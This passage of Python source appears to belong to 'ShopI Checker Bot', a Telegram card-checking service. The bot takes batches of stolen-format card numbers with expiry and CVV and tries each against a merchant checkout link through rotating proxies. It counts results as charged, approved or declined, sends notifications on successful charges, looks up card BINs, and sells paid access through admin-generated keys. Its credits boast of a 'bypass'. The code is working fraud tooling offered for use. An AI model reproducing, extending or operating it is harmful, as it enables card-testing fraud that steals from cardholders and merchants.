                f"{E_GOLD} {fb('Store')}   : {fbe(merchant.get('store','Unknown'))}",
                f"{E_PACK} {fb('Product')} : {fbe(merchant.get('product','Unknown'))}",
                f"{E_DOLR} {fb('Amount')}  : {fbe(merchant.get('amount','-'))}",
                f"{E_PIN} {fb('Url')}: <code>{esc(merchant.get('url') or checkout_url)}</code>",
                "",
            ]
        if finished:
            lines.append(f"{E_OK} {fb('Done')} — {fb(str(total))}/{fb(str(total))} {fb('checked')}")
        else:
            lines.append(f"{E_WAIT} {fb('Checking')} {fb(str(cur_idx))}/{fb(str(total))}")
        lines.append(
            f"{E_OK} {fb('Charged')}: {fb(str(ch))}  "
            f"{E_FIRE} {fb('Approved')}: {fb(str(ap))}  "
            f"{E_X} {fb('Declined')}: {fb(str(dc))}"
        )
        lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for r in done:
            lines.append(_fmt_result(r["idx"], r["card"], r["result"], r["status"]))
        if not finished and cur_masked:
            lines.append(
                f"{E_WAIT} <tg-spoiler>{cur_masked}</tg-spoiler>\n"
                f"       ↳ {fb('Checking now...')}"
            )
        lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        if finished:
            lines.append(
                f"━ {E_CRWN} {fb('Bypassed By Sir Kamal')}\n"
                f"━ {E_PRAY} {fb('Special Thanks Ghost')}\n"
                f"━ {ZANGI} {fb('Developer Zangi')}\n"
                f"━ {E_STAR} {fb('By')} @{esc(update.effective_user.username or str(uid))}"
            )
        text = "\n".join(lines)
        if len(text) > 4000:
            text = text[:3950] + "\n<i>…(truncated)</i>"
        return text

    wait_msg = await update.message.reply_html(build_box([], 1, None, 0, 0, 0))
    done_results: list[dict] = []
    ch = ap = dc = 0
    merchant_info: dict | None = None

    for idx, (card_str, card) in enumerate(parsed_cards, 1):
        masked = f"{card['cc'][:6]}••••••{card['cc'][-4:]}"
        try:
            await wait_msg.edit_text(
                build_box(done_results, idx, masked, ch, ap, dc, merchant=merchant_info),
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

        try:
            result = await asyncio.to_thread(
                run_hit_check, checkout_url, card_str,
                proxy_data=proxy_str, proxy_list=proxy_list_db,
                max_proxy_retries=max(1, len(proxy_list_db)),
            )
        except Exception as exc:
            result = {"ok": False, "error": str(exc)[:120]}

        status = result.get("result_status", "declined") if result.get("ok") else "error"

        _dead_phrases = (
            "no longer active", "expired", "checkout session",
            "session has expired", "already been", "payment link",
            "link is no longer", "link has expired", "order already",
        )
        _err_text = ((result.get("result_msg") or "") + " " + (result.get("error") or "")).lower()
        if any(p in _err_text for p in _dead_phrases):
            done_results.append({"idx": idx, "card": card, "result": result, "status": status})
            dc += 1
            try:
                await wait_msg.edit_text(
                    build_box(done_results, None, None, ch, ap, dc, finished=True, merchant=merchant_info),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
            await update.message.reply_html("⛔ <b>Checkout expired / no longer active — stopped early.</b>")
            return

        if status == "charged":    ch += 1
        elif status == "approved": ap += 1
        else:                      dc += 1

        if result.get("ok"):
            update_stats(uid, status)
            if merchant_info is None:
                site_url = (
                    result.get("success_url") or result.get("return_url") or
                    result.get("redirect_url") or checkout_url
                )
                merchant_info = {
                    "store":   result.get("merchant", "Unknown"),
                    "product": result.get("product", "Unknown"),
                    "amount":  result.get("price_display", "-"),
                    "url":     site_url,
                }
            if status == "charged":
                asyncio.create_task(send_charge_notify(
                    card_str, update.effective_user.username or "", uid, result,
                ))

        done_results.append({"idx": idx, "card": card, "result": result, "status": status})

    try:
        await wait_msg.edit_text(
            build_box(done_results, None, None, ch, ap, dc, finished=True, merchant=merchant_info),
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass


async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not await guard(update):
        return
    if not ctx.args:
        await update.message.reply_html(
            f"{E_X} <b>Usage:</b> <code>/check &lt;card&gt;</code>\n"
            "Format: <code>number|mm|yyyy|cvv</code>"
        )
        return
    card_str = ctx.args[0]
    card     = parse_co_card(card_str)
    if not card:
        await update.message.reply_html(
            f"{E_X} <b>Invalid card format.</b>\n"
            "Use: <code>number|mm|yyyy|cvv</code>"
        )
        return
    bin6 = card["cc"][:6]
    wait = await update.message.reply_html(f"{E_SRCH} Looking up BIN <code>{bin6}</code>...")
    try:
        info = await asyncio.to_thread(bin_lookup, bin6)
    except Exception as exc:
        await wait.edit_text(
            f"{E_X} BIN lookup error: <code>{esc(str(exc)[:200])}</code>",
            parse_mode=ParseMode.HTML,
        )
        return
    masked = f"{card['cc'][:6]}••••••{card['cc'][-4:]}"
    await wait.edit_text(
        f"{ZANGI} {fb('BIN LOOKUP')} {E_SRCH}\n\n"
        f"<b>{E_CARD} Card    :</b> <code>{masked}</code>\n"
        f"<b>{E_ALRM} Expiry  :</b> {card['mm']}/{card['yy']}\n\n"
        f"<b>━━━ BIN Details ━━━</b>\n"
        f"<b>{E_CASH} Bank    :</b> {esc(info.get('bank','Unknown'))}\n"
        f"<b>{E_SPRK} Brand   :</b> {esc(info.get('brand','Unknown'))}\n"
        f"<b>📋 Type    :</b> {esc(info.get('type','Unknown'))}\n"
        f"<b>{E_STAR} Level   :</b> {esc(info.get('level','Unknown'))}\n"
        f"<b>{E_GLOB} Country :</b> {esc(info.get('country','Unknown'))}",
        parse_mode=ParseMode.HTML,
    )


# ═══════════════════════════════════════════════════════════════════════════════
#  ADMIN COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════

async def cmd_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if len(ctx.args) < 2:
        await update.message.reply_html(f"{E_X} <b>Usage:</b> <code>/auth &lt;user_id&gt; &lt;days&gt;</code>")
        return
    try:
        target_id = int(ctx.args[0])
        days      = int(ctx.args[1])
    except ValueError:
        await update.message.reply_html(f"{E_X} <b>Invalid args.</b> Provide numeric user_id and days.")
        return
    try:
        chat  = await ctx.bot.get_chat(target_id)
        fname = chat.first_name or str(target_id)
        uname = chat.username or ""
    except Exception:
        fname, uname = str(target_id), ""
    expires_at = upsert_user(target_id, uname, fname, days, update.effective_user.id)
    exp_str    = datetime.fromisoformat(expires_at).strftime("%Y-%m-%d %H:%M UTC")
    await update.message.reply_html(
        f"{E_OK} <b>User Authorized</b>\n\n"
        f"<b>{E_PIN} ID      :</b> <code>{target_id}</code>\n"
        f"<b>{E_LIKE} Name    :</b> {esc(fname)}\n"
        f"<b>{E_WAIT} Days    :</b> {days}\n"
        f"<b>{E_ALRM} Expires :</b> {exp_str}"
    )
    try:
        await ctx.bot.send_message(
            target_id,
            f"{ZANGI} {fb('AUTHORIZED')} {E_OK}\n\n"
            f"<b>{E_WAIT} Duration :</b> {days} days\n"
            f"<b>{E_ALRM} Expires  :</b> {exp_str}\n\n"
            f"Use /cmds to see available commands.",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass


async def cmd_deauth(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not ctx.args:
        await update.message.reply_html(f"{E_X} <b>Usage:</b> <code>/deauth &lt;user_id&gt;</code>")
        return
    try:
        target_id = int(ctx.args[0])
    except ValueError:
        await update.message.reply_html(f"{E_X} Invalid user_id.")
        return
    deauth_user(target_id)
    await update.message.reply_html(
        f"🔴 <b>User Deauthorized</b>\n"
        f"<b>{E_PIN} ID :</b> <code>{target_id}</code>"
    )
    try:
        await ctx.bot.send_message(
            target_id,
            "🔴 <b>Your access has been revoked.</b>\n"
            "Contact the administrator for reauthorization.",
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass


async def cmd_adddays(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if len(ctx.args) < 2:
        await update.message.reply_html(f"{E_X} <b>Usage:</b> <code>/adddays &lt;user_id&gt; &lt;days&gt;</code>")
        return
    try:
        target_id = int(ctx.args[0])
        days      = int(ctx.args[1])
    except ValueError:
        await update.message.reply_html(f"{E_X} Invalid args.")
        return
    if add_days(target_id, days):
        await update.message.reply_html(f"{E_OK} Added <b>{days} days</b> to <code>{target_id}</code>")
        try:
            await ctx.bot.send_message(
                target_id,
                f"{E_FIRE} <b>{days} days</b> have been added to your account!",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    else:
        await update.message.reply_html(f"{E_X} User not found in database.")


async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    days = 30
    if ctx.args:
        try:
            days = int(ctx.args[0])
        except ValueError:
            await update.message.reply_html(f"{E_X} Invalid days value.")
            return
    key = create_key(days, update.effective_user.id)
    exp = (datetime.utcnow() + timedelta(days=days)).strftime("%Y-%m-%d")
    await update.message.reply_html(
        f"{ZANGI} {fb('KEY GENERATED')} {E_DIAM}\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<code>{key}</code>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        f"<b>{E_WAIT} Valid for :</b> {days} days\n"
        f"<b>{E_ALRM} Expires  :</b> {exp}\n"
        f"<b>{E_LOCK} Status   :</b> Unused\n\n"
        f"<i>Share this key with the user to activate their account.</i>"
    )


async def cmd_genkeys(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if len(ctx.args) < 2:
        await update.message.reply_html(
            f"{E_X} <b>Usage:</b> <code>/genkeys &lt;amount&gt; &lt;days&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/genkeys 10 3</code>  — generate 10 keys valid for 3 days\n"
            "<code>/genkeys 5 30</code>  — generate 5 keys valid for 30 days"
        )
        return
    try:
        amount = int(ctx.args[0])
        days   = int(ctx.args[1])
    except ValueError:
        await update.message.reply_html(f"{E_X} <b>Both amount and days must be numbers.</b>")
        return
    if amount < 1 or amount > 100:
        await update.message.reply_html(f"{E_X} <b>Amount must be between 1 and 100.</b>")
        return
    if days < 1:
        await update.message.reply_html(f"{E_X} <b>Days must be at least 1.</b>")
        return

    uid  = update.effective_user.id
    exp  = (datetime.utcnow() + timedelta(days=days)).strftime("%Y-%m-%d")
    keys = [create_key(days, uid) for _ in range(amount)]

    key_lines = "\n".join(keys)
    header = (
        f"{ZANGI} {fb('BATCH KEYS GENERATED')} {E_DIAM}\n\n"
        f"<b>{E_STAT} Count   :</b> {amount} keys\n"
        f"<b>{E_WAIT} Valid   :</b> {days} days each\n"
        f"<b>{E_ALRM} Expires :</b> {exp}\n"
        f"<b>{E_LOCK} Status  :</b> All unused\n\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
        f"<code>{key_lines}</code>\n"
        f"<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
        f"<i>Copy and share these keys with users to activate their accounts.</i>"
    )
    if len(header) <= 4096:
        await update.message.reply_html(header)
    else:
        summary = (
            f"{ZANGI} {fb('BATCH KEYS GENERATED')} {E_DIAM}\n\n"
            f"<b>{E_STAT} Count   :</b> {amount} keys\n"
            f"<b>{E_WAIT} Valid   :</b> {days} days each\n"
            f"<b>{E_ALRM} Expires :</b> {exp}\n"
            f"<b>{E_LOCK} Status  :</b> All unused\n\n"
            f"<i>Keys sent below in chunks.</i>"
        )
        await update.message.reply_html(summary)
        for i in range(0, len(keys), 20):
            chunk = keys[i:i + 20]
            await update.message.reply_html(
                f"<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
                f"<code>" + "\n".join(chunk) + "</code>\n"
                f"<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>"
            )


async def cmd_delkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not ctx.args:
        await update.message.reply_html(f"{E_X} <b>Usage:</b> <code>/delkey &lt;KEY&gt;</code>")
        return
    key_val = ctx.args[0].upper()
    if delete_key(key_val):
        await update.message.reply_html(f"{E_OK} Key <code>{esc(key_val)}</code> deleted.")
    else:
        await update.message.reply_html(f"{E_X} Key not found or already used (cannot delete).")


async def cmd_keys(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    keys = get_all_keys()
    if not keys:
        await update.message.reply_html("📭 No keys have been generated yet.")
        return
    lines = [f"{ZANGI} {fb('ALL KEYS')} ({len(keys)}) {E_DIAM}\n"]
    for k in keys[:20]:
        badge = f"{E_OK} Used by <code>{k['used_by']}</code>" if k["used_by"] else f"{E_LOCK} Unused"
        lines.append(
            f"<code>{esc(k['key_value'])}</code>\n"
            f"  {E_WAIT} {k['days']}d | {badge} | {(k['created_at'] or '')[:10]}\n"
        )
    if len(keys) > 20:
        lines.append(f"\n<i>Showing 20 of {len(keys)} keys.</i>")
    await update.message.reply_html("\n".join(lines))


async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    users = get_all_users()
    if not users:
        await update.message.reply_html("📭 No users in the database yet.")
        return
    lines = [f"{ZANGI} {fb('ALL USERS')} ({len(users)}) {E_ANON}\n"]
    for u in users[:15]:
        badge = status_badge(u)
        total = u["checks_done"] or 0
        lines.append(
            f"<b>{E_PIN} {u['user_id']}</b> — {esc(u['first_name'] or 'Unknown')}\n"
            f"  {badge} | {days_left(u['expires_at'])} | {E_STAT} {total} checks\n"
        )
    if len(users) > 15:
        lines.append(f"\n<i>...and {len(users)-15} more. Use /status &lt;uid&gt;.</i>")
    await update.message.reply_html("\n".join(lines))


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not ctx.args:
        await update.message.reply_html(f"{E_X} <b>Usage:</b> <code>/status &lt;user_id&gt;</code>")
        return
    try:
        target_id = int(ctx.args[0])
    except ValueError:
        await update.message.reply_html(f"{E_X} Invalid user_id.")
        return
    row = get_user(target_id)
    if not row:
        await update.message.reply_html(f"{E_X} User not found in database.")
        return
    total    = row["checks_done"] or 0
    charged  = row["charged"]     or 0
    approved = row["approved"]    or 0
    declined = row["declined"]    or 0
    rate     = f"{charged/total*100:.1f}%" if total else "—"
    await update.message.reply_html(
        f"{ZANGI} {fb('USER STATUS REPORT')} {E_STAT}\n\n"
        f"<b>{E_PIN} User ID    :</b> <code>{row['user_id']}</code>\n"
        f"<b>{E_LIKE} Name       :</b> {esc(row['first_name'] or 'Unknown')}\n"
        f"<b>{E_STAR} Username   :</b> @{esc(row['username'] or 'N/A')}\n\n"
        f"<b>━━━ {E_LOCK} Access ━━━</b>\n"
        f"<b>{E_STAT} Status     :</b> {status_badge(row)}\n"
        f"<b>{E_WAIT} Expires    :</b> {days_left(row['expires_at'])}\n"
        f"<b>📅 Joined     :</b> {(row['created_at'] or '')[:10]}\n"
        f"<b>{E_DIAM} Key Used   :</b> <code>{esc(row['key_used'] or 'Direct')}</code>\n"
        f"<b>👮 Authed By  :</b> <code>{row['authorized_by'] or '—'}</code>\n\n"
        f"<b>━━━ {E_STAT} Statistics ━━━</b>\n"
        f"<b>{E_STAT} Total      :</b> {total}\n"
        f"<b>{E_CASH} Charged    :</b> {charged}\n"
        f"<b>{E_OK} Approved   :</b> {approved}\n"
        f"<b>{E_X} Declined   :</b> {declined}\n"
        f"<b>{E_STAT} Charge Rate:</b> {rate}\n\n"
        f"<b>{E_GLOB} Proxy      :</b> <code>{esc(row['proxy'] or 'Not set')}</code>"
    )


async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not ctx.args:
        await update.message.reply_html(f"{E_X} <b>Usage:</b> <code>/broadcast &lt;message&gt;</code>")
        return
    text      = " ".join(ctx.args)
    users     = get_all_users()
    status_msg = await update.message.reply_html(f"📡 <b>Broadcasting to {len(users)} users...</b>")
    sent = failed = 0
    for u in users:
        try:
            await ctx.bot.send_message(
                u["user_id"],
                f"{E_ANON} <b>Announcement</b>\n\n{esc(text)}",
                parse_mode=ParseMode.HTML,
            )
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)
    await status_msg.edit_text(
        f"📡 <b>Broadcast Complete</b>\n\n"
        f"{E_OK} Delivered : {sent}\n"
        f"{E_X} Failed    : {failed}",
        parse_mode=ParseMode.HTML,
    )


async def cmd_chatid(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat = update.effective_chat
    await update.message.reply_html(
        f"<b>Chat ID:</b> <code>{chat.id}</code>\n"
        f"<b>Title  :</b> {html.escape(chat.title or 'N/A')}\n"
        f"<b>Type   :</b> {chat.type}"
    )


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("chatid",               cmd_chatid))
    app.add_handler(CommandHandler("start",                cmd_start))
    app.add_handler(CommandHandler(["cmds", "help", "commands"], cmd_cmds))
    app.add_handler(CommandHandler("me",                   cmd_me))
    app.add_handler(CommandHandler("setproxy",             cmd_setproxy))
    app.add_handler(CommandHandler("checkproxy",           cmd_checkproxy))
    app.add_handler(CommandHandler("delproxy",             cmd_delproxy))
    app.add_handler(CommandHandler("hit",                  cmd_hit))
    app.add_handler(CommandHandler("mhit",                 cmd_mhit))
    app.add_handler(CommandHandler("check",                cmd_check))
    app.add_handler(CommandHandler("auth",                 cmd_auth))
    app.add_handler(CommandHandler("deauth",               cmd_deauth))
    app.add_handler(CommandHandler("adddays",              cmd_adddays))
    app.add_handler(CommandHandler("genkey",               cmd_genkey))
    app.add_handler(CommandHandler("genkeys",              cmd_genkeys))
    app.add_handler(CommandHandler("delkey",               cmd_delkey))
    app.add_handler(CommandHandler("keys",                 cmd_keys))
    app.add_handler(CommandHandler("users",                cmd_users))
    app.add_handler(CommandHandler("status",               cmd_status))
    app.add_handler(CommandHandler("broadcast",            cmd_broadcast))

    print(f"{E_OK} ShopI Checker Bot is online.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
